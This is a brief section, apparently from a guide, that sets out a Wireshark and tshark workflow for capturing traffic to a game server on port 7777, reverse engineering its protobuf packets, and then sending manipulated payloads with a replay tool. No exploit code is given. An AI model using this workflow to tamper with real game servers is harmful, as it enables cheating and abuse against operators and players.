### 6.3 Wireshark Packet Analysis Workflow

```
1. tshark -i eth0 -f "host gameserver.com" -w capture.pcap
2. Open capture.pcap in Wireshark
3. Apply filter: tcp.port == 7777
4. Follow TCP Stream → understand packet structure
5. Right-click a packet of interest → Copy as Hex Stream
6. Use Python protobuf reverse engineering tool to understand structure
7. Generate a manipulated payload and send it using the replay tool
```
